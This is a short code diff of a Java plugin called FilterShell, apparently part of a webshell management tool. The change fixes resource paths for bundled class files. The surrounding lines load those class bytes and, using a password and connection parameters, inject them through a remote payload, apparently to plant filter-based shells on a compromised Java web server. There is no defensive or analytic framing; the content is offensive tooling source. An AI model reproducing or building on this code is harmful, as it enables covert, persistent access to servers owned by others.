@@ -85,7 +85,7 @@ public class FilterShell implements Plugin {
    private void loadFilterManage() {
       if (!this.loadState) {
          try {
-            InputStream inputStream = this.getClass().getResourceAsStream("assets/FilterManage.classs");
+            InputStream inputStream = this.getClass().getResourceAsStream("/shells/plugins/java/assets/FilterManage.classs");
             byte[] data = functions.readInputStream(inputStream);
             inputStream.close();
             if (this.payload.include("plugin.FilterManage", data)) {
@@ -113,7 +113,7 @@ public class FilterShell implements Plugin {
             reqParameter.add("ck", ck);
             reqParameter.add("pwd", password);
             String className = String.format("f.%s", shellName);
-            InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/F_%s.classs", shellName));
+            InputStream inputStream = this.getClass().getResourceAsStream(String.format("/shells/plugins/java/assets/F_%s.classs", shellName));
             byte[] classByteArray = functions.readInputStream(inputStream);
             inputStream.close();
             boolean loaderState = this.payload.include(className, classByteArray);
